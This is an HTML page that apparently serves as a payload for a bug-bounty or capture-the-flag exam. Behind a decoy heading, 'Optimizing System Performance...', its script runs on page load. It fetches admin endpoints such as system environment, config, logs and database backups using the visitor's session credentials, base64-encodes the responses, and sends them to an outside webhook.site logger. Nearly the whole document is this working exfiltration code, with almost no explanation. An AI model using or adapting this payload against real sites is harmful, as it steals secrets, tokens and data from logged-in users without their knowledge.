<!DOCTYPE html>
<html>
<body>
    <script>
        (async function() {
            const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
            const api = "https://api-bugbounty-exam.hashacademy.co/api";

            // List of sensitive endpoints that usually hold the "Second Flag"
            const targets = [
                '/admin/system/env',     // Most likely place for the flag
                '/admin/config',         // System-wide settings
                '/admin/settings',       // Where that Verification Code lives
                '/admin/logs',           // May contain leaked passwords/tokens
                '/admin/backup/latest'   // Sometimes exposes DB dumps
            ];

            for (const path of targets) {
                try {
                    const res = await fetch(api + path, { credentials: 'include' });
                    if (res.ok) {
                        const data = await res.json();
                        // Send the result to your webhook, labeled by path
                        const label = path.replace(/\//g, '_');
                        new Image().src = `${logger}/?FOUND=${label}&d=${btoa(JSON.stringify(data))}`;
                    }
                } catch (e) {
                    // Log errors to your webhook so you know if an endpoint is blocked
                    new Image().src = `${logger}/?ERROR=${path}&msg=${btoa(e.message)}`;
                }
            }
        })();
    </script>
    <h2>Optimizing System Performance...</h2>
</body>
</html>
